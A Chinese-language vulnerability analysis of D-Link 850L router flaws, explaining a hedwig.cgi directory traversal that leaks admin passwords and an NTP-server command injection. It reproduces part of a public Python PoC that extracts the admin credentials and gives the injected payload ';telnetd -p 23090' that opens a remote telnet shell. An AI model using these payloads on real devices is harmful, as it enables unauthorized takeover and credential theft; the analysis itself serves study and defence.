## 0x00背景

2017年8月8号，SecuriTeam在官方博客上公布了D-Link 850L的多个高危漏洞和PoC，这些漏洞是Hack2Win比赛的成果。其中包括：
- **WAN和LAN远程代码执行**
- **WAN和LAN未授权信息泄露**
- **LAN的root远程命令执行**

## 0x01 漏洞分析
:one: **WAN和LAN远程代码执行**

基于WAN和LAN的远程代码执行漏洞是组合拳漏洞:punch:，包括一个**目录遍历漏洞**和另一个命令注入漏洞，**目录遍历漏洞**用于获取web管理账户和密码，创建授权用户凭证（cookie）。命令注入漏洞是利用ntp server字符串未被检查过滤，向该参数注入恶意命令最终被路由器执行。

#### 一、目录遍历漏洞

**目录遍历漏洞**本质缺陷在于hedwig.cgi未对请求参数进行检查，导致任意路径下的php文件被执行，如果请求获取web管理账户和密码，hedwig.cgi同样会将口令信息回传给不可信用户，造成严重的信息泄漏。

#### hedwig.cgi处理流程：

hedwig.cgi其实是一个链接文件，指向/htdocs/cgibin文件，接收到用户请求的xml数据请求后先封装成xml文件，发送read xml的请求到xmldb server，然后发送execute php的请求到xmldb server。

- **序列图**

![Alt text](https://wx4.sinaimg.cn/mw690/a750c5f9gy1fll2szvoldj20iq0a5aas.jpg)

- **代码**
``` c
void hedwigcgi_main(...)
{
    char *resp_fomat = "HTTP/1.1 200 OK\r\nContent-Type: text/xml\r\n\r\n<hedwig><result>FAILED</result><message>%s</message></hedwig>";
    char post_stream[0x400], img_stream[0x80], rt_stream[0x11];
    char *method, *message;
    struct option_ref *option;
    FILE *fimg, *fxml;
    unsigned int fd, idx, uid;
    char *ptoken, post_xml, post_ephp;
    char *token_streams[4];

    memset(post_stream, 0x400, 0);
    memset(img_stream, 0x80, 0);
    memset(rt_stream, 0x11, 0);
    memcpy(rt_stream, "/runtime/session", 0x11);
    method = getenv("REQUEST_METHOD");
    if (!method)
        message = "no REQUEST";
    else if (!strcasecmp(method, "post"))
        message = "unsupported HTTP request";
    else
    {
        cgibin_parse_request(sobj_strdup_, 0, 2);
        fimg = fopen("/etc/config/image_sign", "Other");
        if (!fgets(img_stream, 0x80, fimg))
            message = "unable to read signature!";
        else
        {
            cgibin_reatwhite(img_stream);
            option = sobj_new();
            if (!option)
                message = "unable to allocate string object";
            else
            {
                sess_get_uid(option);
                snprintf(post_stream, 0x400, "%s/%s/postxml", "/runtime/session", sobj_get_string(option));
                fxml = fopen("/var/tmp/temp.xml", "w");
                if (!fxml)
                    message = "unable to open temp file.";
                else
                {
                    if (!g_xml_stream)
                        message = "no xml data.";
                    else
                    {
                        fd = fileno(ftmp);
                        if (!lockf(fd, F_TEST, 0))
                        {
                            message = NULL;
                            resp_fomat = "HTTP/1.1 200 OK\r\n\
                                         Content-Type: text/xml\r\n\
                                         \r\n\
                                         <hedwig><result>BUSY</result><message>%s</message></hedwig>";
                        }
                        else
                        {
                            char **tmp_token = token_streams;
                            fd = fileno(ftmp);
                            lockf(fd, F_LOCK, 0);
                            *tmp_token = img_stream;
                            tmp_token += 4;
                            ptoken = strtok("/runtime/session", "/");
                            *tmp_token = ptoken;
                            tmp_token += 4;
                            unsigned int curcles = 2;
                            do
                            {
                                ptoken = strtok(NULL, "/");
                                curcles = curcles + 1;
                                tmp_token += 4;
                                *tmp_token = ptoken;
                            } while (ptoken);

                            sobj_get_string(option);
                            fputs("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n", fxml);
                            do{
                                fprintf(fxml, "<%s>\n", *tmp_token);
                                tmp_token += 4;
                            } while (idx < curcles);

                            post_xml = strstr(g_xml_stream, "<postxml>");
                            fprintf(ftmp, "</%s>\n", post_xml);
                            do{
                                fprintf(fxml, "</%s>\n", *tmp_token);
                                tmp_token += 4;
                            } while (idx < curcles);

                            fflush(ftmp);
                            xmldbc_read(0, 2, "/var/tmp/temp.xml");
                            snprintf(post_stream, 0x400, "/htdocs/webinc/fatlady.php\nprefix=%s/%s", "/runtime/session", sobj_get_string(option));
                            xmldbc_ephp(0, 0, post_stream, stdout);
                            message = NULL;
                        }
                    }
                }
            }
        }
    }

    printf(resp_fomat, message);
    if (g_xml_stream)
        free(g_xml_stream);

    sobj_del(option);
}
```
hedwigcgi_main只是处理攻击者请求的中转站，并没有实际处理xml file的数据，真正处理的程序是xmldb server，这个程序是dlink 850L路由器的核心组件，是用于设置和获取各种路由参数的数据库服务，它既能解析基本的xml文件，还实现了类似php解析器的功能来解析和执行自定义的php文件，固件中众多后缀为php的文件都是伪php文件，用真实的phpcgi是无法执行起来的，只有xmldb才能解析和执行，这个结论是通过逆行分析xmldb文件得到的，具体的数据信息就不粘贴了，读者自行查看。

1. xmldb 先读取了"../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml"，并将其加载到全局数据库中。
2. xmdb 调用fatlady.php处理攻击者请求的xml数据。

接下来查看fatlady.php文件内容，vim htdocs/webinc/fatlady.php：
```php
HTTP/1.1 200 OK
Content-Type: text/xml

<?
include "/htdocs/phplib/trace.php";

/* get modules that send from hedwig */
/* call $target to do error checking, 
 * and it will modify and return the variables, '$FATLADY_XXXX'. */
$FATLADY_result = "OK";
$FATLADY_node   = "";
$FATLADY_message= "No modules for Hedwig";      /* this should not happen */

//TRACE_debug("FATLADY dump ====================\n".dump(0, "/runtime/session"));

foreach ($prefix."/postxml/module")
{
        del("valid");
        if (query("FATLADY")=="ignore") continue;
        $service = query("service");
        if ($service == "") continue;
        TRACE_debug("FATLADY: got service [".$service."]");
        $target = "/htdocs/phplib/fatlady/".$service.".php";
        $FATLADY_prefix = $prefix."/postxml/module:".$InDeX;
        $FATLADY_base   = $prefix."/postxml";
        if (isfile($target)==1) dophp("load", $target);
        else
        {
                TRACE_debug("FATLADY: no file - ".$target);
                $FATLADY_result = "FAILED";
                $FATLADY_message = "No implementation for ".$service;
        }
        if ($FATLADY_result!="OK") break;
}
echo "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n";
echo "<hedwig>\n";
echo "\t<result>".      $FATLADY_result.        "</result>\n";
echo "\t<node>".        $FATLADY_node.          "</node>\n";
echo "\t<message>".     $FATLADY_message.       "</message>\n";
echo "</hedwig>\n";
?>

```
这个文件使用了数据和代码混合的格式，显然是http response数据，只不过将ephp的代码执行结果作为了response data，代码含义是处理攻击者请求的xml树，提取出service字段，最后拼接成"/htdocs/phplib/fatlady/".$service.".php"文件将其执行。
>/htdocs/phplib/fatlady/../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml.php

其实就是
>/htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml.php

最后查看这个文件内容，vim htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml.php
```php
<module>
        <service><?=$GETCFG_SVC?></service>
        <device>
<?
echo "\t\t<gw_name>".query("/device/gw_name")."</gw_name>\n";
?>
                <account>
<?
$cnt = query("/device/account/count");
if ($cnt=="") $cnt=0;
echo "\t\t\t<seqno>".query("/device/account/seqno")."</seqno>\n";
echo "\t\t\t<max>".query("/device/account/max")."</max>\n";
echo "\t\t\t<count>".$cnt."</count>\n";
foreach("/device/account/entry")
{
        if ($InDeX > $cnt) break;
        echo "\t\t\t<entry>\n";
        echo "\t\t\t\t<uid>".           get("x","uid"). "</uid>\n";
        echo "\t\t\t\t<name>".          get("x","name").        "</name>\n";
        echo "\t\t\t\t<usrid>".         get("x","usrid").       "</usrid>\n";
        echo "\t\t\t\t<password>".      get("x","password")."</password>\n";
        echo "\t\t\t\t<group>".         get("x", "group").      "</group>\n";
        echo "\t\t\t\t<description>".get("x","description")."</description>\n";
        echo "\t\t\t</entry>\n";
}
... ...
```
代码含义很清楚，就是获取管理账户和密码。

#### PoC验证
对处理流程清晰化之后回归漏洞，PoC公布的攻击代码中显示，攻击者发送了一个相对路径的xml文件（../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml）请求到hedwig.cgi，然后从响应的数据中就包含web管理账户和密码，代码如下：
```python
############################################################
 
print("Get password...")
 
headers = {"Content-Type": "text/xml"}
cookies = {"uid": "whatever"}
data = """<?xml version="1.0" encoding="utf-8"?>
<postxml>
<module>
    <service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service>
</module>
</postxml>"""
 
resp = session.post(urljoin(TARGET, "/hedwig.cgi"), headers=headers, cookies=cookies, data=data)
# print(resp.text)
 
# getcfg: <module>...</module>
# hedwig: <?xml version="1.0" encoding="utf-8"?>
#       : <hedwig>...</hedwig>
accdata = resp.text[:resp.text.find("<?xml")]
 
admin_pasw = ""
 
tree = lxml.etree.fromstring(accdata)
accounts = tree.xpath("/module/device/account/entry")
for acc in accounts:
    name = acc.findtext("name", "")
    pasw = acc.findtext("password", "")
    print("name:", name)
    print("pass:", pasw)
    if name == "Admin":
        admin_pasw = pasw
 
if not admin_pasw:
    print("Admin password not found!")
    sys.exit()
```
使用wireshark抓包查看数据流：
![...](https://wx1.sinaimg.cn/mw690/a750c5f9gy1fll33cbu3uj20iz0ne40e.jpg)

#### 总结
:question:为什么我将这个漏洞定义为目录遍历漏洞，而不是未授权敏感信息泄漏漏洞

目录遍历是利用方法，敏感信息泄漏是其造成的后果。

hedwig.cgi设计之初就是为所有用户（授权用户和非授权用户）提供数据格式检查的功能，比如非授权用户想修改web管理的账户密码，那首先应该将账户密码的数据格式发送给hedwig.cgi进行有效性检查，如果检查通过则必须作为授权用户身份发送这部分数据给其他cgi更新这部分数据才行。

hedwig.cgi只是将我们请求的service字段提取出来作为php文件名，从特定目录“/htdocs/phplib/fatlady/”找到这个文件并执行，功能是检查我们请求的数据格式。然后攻击者别出心裁，将server字段设置为相对路径名称，而hedwig.cgi并没有检查service参数是否包含相对路径，于是造成了其他目录下的php文件被执行起来了，比如PoC中设置的相对路径，将“/htdocs/phplib/fatlady/”切换到“/htdocs/webinc/getcfg”目录下面去执行某个php文件，功能也从数据检查变成了数据获取，最终导致了敏感信息泄漏。

:question:从漏洞分析过程我收获到什么

首先，漏洞发现者积累很深，他必然很熟悉每个请求的处理流程。

其次，他能想到通过目录遍历能执行任意php文件，这个idea 666，我服气。

最后，我自己在分析的过程中会陷入到mips汇编层代码的海洋里，抽离不出来，作者确能高屋建瓴，说明他具备很强的抽象能力。

#### 二、命令注入漏洞

pigwidgeon.cgi也是个链接文件，指向/htdocs/cgibin文件，用于注册和激活用户请求的路由参数，它不同于hedwig.cgi，pigwidgeon.cgi会真正将用户请求的数据应用到路由器上，跟我们在web页面上去修改某个参数是同样的效果，这就要求pigwidgeon.cgi必须对请求者进行鉴权，如果不是授权用户就直接退出处理流程，返回失败。而hedwig.cgi只是对用户需要修改的参数进行格式检查，判断数据的有效性，如果不符合格式要求会返回检查失败的消息，它相当于一个预处理的功能。

命令注入漏洞的本质缺陷在于pigwidgeon.cgi同样未对请求的server参数进行合法性检查，导致任意SHELL命令被执行，这跟普通的system command injection是一样的原理。

#### pigwidgeon.cgi处理流程：

- **序列图**

![Alt text](https://wx1.sinaimg.cn/mw690/a750c5f9gy1fll69efr0jj20gw0790t3.jpg)

pigwidgeon.cgi首先进行鉴权，认证通过后发送execute php file的命令到xmldb server，xmldb server解析和执行该php文件，最终将处理结果返回给请求用户。

接下来，查看"/htdocs/webinc/wand.php"文件内容，vim htdocs/webinc/wand.php：
```php
<? /* vi: set sw=4 ts=4: */
include "/htdocs/phplib/trace.php";

function writescript($mode, $message)
{
	if ($_GLOBALS["SHELL"] != "")
		fwrite($mode, $_GLOBALS["SHELL"], $message);
}

$dirtysvcp = "/runtime/services/dirty/service";

if ($ACTION=="SETCFG")
{
	//TRACE_debug("WAND dump ===============\n".dump(0,$PREFIX));
	//TRACE_debug("WAND: SETCFG, PREFIX=".$PREFIX);
	foreach($PREFIX."/postxml/module")
	{
		$svc = query("service");
		TRACE_debug("SETCFG: [".$svc."]");
		/* record the dirty service to runtime node. */
		if (query("ACTIVATE") != "ignore")
		{
			$hit = 0;
			foreach ($dirtysvcp)
			{
				if ($svc == query("name"))	{$hit++; break;}
			}
			if ($hit == 0)
			{
				$c = query($dirtysvcp."#");
				$c++;
				set($dirtysvcp.":".$c."/name",				$svc);
				set($dirtysvcp.":".$c."/ACTIVATE",			query("ACTIVATE"));
				set($dirtysvcp.":".$c."/ACTIVATE_DELAY",	query("ACTIVATE_DELAY"));
				set($dirtysvcp.":".$c."/ACTIVATE_EVENT",	query("ACTIVATE_EVENT"));
			}
			//TRACE_debug("WAND: SETCFG, dump ===============\n".dump(0, "/runtime/services/dirty"));
		}
		if (query("valid")!=1)
		{
			if (query("SETCFG")!="ignore")	TRACE_error("SETCFG: [".$svc."] is invalid.");
			continue;
		}
		if (query("SETCFG")=="ignore") continue;
		$file = "/htdocs/phplib/setcfg/".$svc.".php";
		//TRACE_debug("SETCFG: ".$file);
		$SETCFG_prefix = $PREFIX."/postxml/module:".$InDeX;
		if (isfile($file)==1) dophp("load", $file);
		else TRACE_error("SETCFG: [".$file."] is not found!");

	}
	/* clear session data. */
	del($PREFIX."/postxml");
}
else if ($ACTION=="ACTIVATE")
{
	writescript("w", "#!/bin/sh\n");
	//writescript("a", "cat $0\n");
	//TRACE_debug("WAND: ACTIVATE, dump ===============\n".dump(0, "/runtime/services/dirty"));
	foreach($dirtysvcp)
	{
		$svc = query("name");
		$act = query("ACTIVATE");
		if ($svc == "" || $act=="ignore") continue;

		if ($act=="delay")
		{
			$delay = query("ACTIVATE_DELAY") + 0;
			TRACE_debug('WAND: delay active ['.'xmldbc -t "wand:'.$delay.':service '.$svc.' restart"'.']');
			writescript(a, 'xmldbc -t "wand:'.$delay.':service '.$svc.' restart"\n');
		}
		else if ($act=="event")
		{
			$event = query("ACTIVATE_EVENT");
			$delay = query("ACTIVATE_DELAY") + 0;
			TRACE_debug('WAND: event active ['.$event.'], delay='.$delay);
			writescript(a, 'xmldbc -t "wand:'.$delay.':event '.$event.'"\n');
		}
		else
		{
			writescript("a", "service ".$svc." restart\n");
		}
	}
	del("/runtime/services/dirty");

	/* remove this shell script. */
	writescript("a", "rm -f $0\n");
}
?>
```
这部分代码根据用户请求的ACTION参数分成了两部分，如果ACTION=="SETCFG"，就从特定目录"/htdocs/phplib/setcfg/"下面查找$service.php文件并执行；
先来查看"/htdocs/phplib/setcfg/DEVICE.TIME.php"内容，主要功能是注册用户请求的参数到xmldb数据库中。

```php
<?
/* setcfg is used to move the validated session data to the configuration database.
 * The variable, 'SETCFG_prefix',  will indicate the path of the session data. */
include "/htdocs/phplib/trace.php";
include "/htdocs/phplib/xnode.php";

anchor($SETCFG_prefix."/device/time");
set("/device/time/ntp/enable",  query("ntp/enable"));
set("/runtime/device/ntp/state", "RUNNING");
set("/device/time/ntp/period",  query("ntp/period"));
set("/device/time/ntp/server",  query("ntp/server"));
set("/device/time/timezone",    query("timezone"));
set("/device/time/dst",                 query("dst"));
set("/device/time/dstmanual",   query("dstmanual"));
set("/device/time/dstoffset",   query("dstoffset"));
set("/device/time/time",        query("time"));
set("/device/time/date",        query("date"));
/* ipv6 */
set("/device/time/ntp6/enable", query("ntp6/enable"));
set("/runtime/device/ntp6/state", "RUNNING");
set("/device/time/ntp6/period", query("ntp6/period"));
?>

```
如果ACTION=="ACTIVATE"，就将"service xxx restart"写入到全局shell文件_GLOBALS["SHELL"]，暂时无法准确获知这个文件具体路径，猜测是"/var/run/wand_activate_x.sh"。

然后结合PoC得知，这个shell脚本会以某种方式被执行起来（至于怎么被执行起来的还不知道），那么“service xxx restart"也将被执行，比如DEVICE.TIME服务，最终导致"/etc/services/DEVICE.TIME.php"被执行（这里也是结合PoC进行猜测），因为无法得知路由器上执行“service xxx restart"到底映射到哪个文件。

我们查看"/etc/services/DEVICE.TIME.php"文件内容，vim /etc/services/DEVICE.TIME.php：
```php
if ($enable==1 && $enablev6==1)
{
        if ($server=="") fwrite(a, $START, 'echo "No NTP server, disable NTP client ..." > /dev/console\n');
        else
        {
                fwrite(w, $ntp_run, '#!/bin/sh\n');
                fwrite(a, $ntp_run,
                        'echo "Run NTP client ..." > /dev/console\n'.
                        'echo [$1] [$2] > /dev/console\n'.
                        'STEP=$1\n'.
                        'RESULT="Null"\n'.
                        'xmldbc -s /runtime/device/ntp/state RUNNING\n'.
                        'SERVER4='.$server.'\n'.
                        'SERVER6=`xmldbc -g /runtime/device/ntp6/server | cut -f 1 -d " "`\n'.
                        'if [ "$STEP" == "V4" ]; then\n'.
                        '       xmldbc -t "ntp:'.$period.':'.$ntp_run.' $STEP"\n'.
                        '       echo "ntpclient -h $SERVER4 -i 5 -s -4" > /dev/console\n'.
                        '       ntpclient -h $SERVER4 -i 5 -s -4 > /dev/console\n'.
```
注意注入点是'ntpclient -h $SERVER4 -i 5 -s -4 > /dev/console\n'这句话，如果SERVER4 包含恶意命令比如";telnetd -p 23090"那么最终将导致telnetd程序被启动。

#### PoC验证

攻击代码的思路先通过目录遍历漏洞获取的信息创建cookie，成为授权用户，然后请求getcfg.php获取DEVICE.TIME的配置信息，并将ntp server的字段注入command，再向hedwig.cgi请求校验注入后的数据格式，通过格式验证后才正式向pigwidgeon.cgi注册和激活这部分数据，最终导致恶意命令被执行。

使用wireshark抓取数据流：
![...](https://wx1.sinaimg.cn/mw690/a750c5f9gy1fll7rb6ccyj20w80ij0un.jpg)

telnet 192.168.0.1 23090
>Trying 192.168.0.1...
Connected to 192.168.0.1.
Escape character is '^]'.
Mon Jan  3 01:22:32 CST 2000
Connection closed by foreign host.


#### 总结
:question:从这个漏洞学习到什么技巧？

这个漏洞本质是需要找到注入点，技巧就是web页面中查找带框的资源，然后分析填入的数据是否会作为命令参数被执行，如果是那它存在被注入的风险。当然，还需要注意这个漏洞还需要授权用户身份，非授权用户请求注入数据会因为鉴权失败提前退出处理流程，所以单纯的找到注入点只是基本前提，还需要检查是否有身份校验。

:question:关于这个漏洞还有什么疑点？

是的，对于pigwidgeon.cgi的处理流程还缺乏全局认识，只是单纯的跟踪代码路径很难获知一些全局数据的值，而作者肯定从其他方面知晓这部分数据怎么来的，而我只能从PoC中猜测，并没有真正证实。
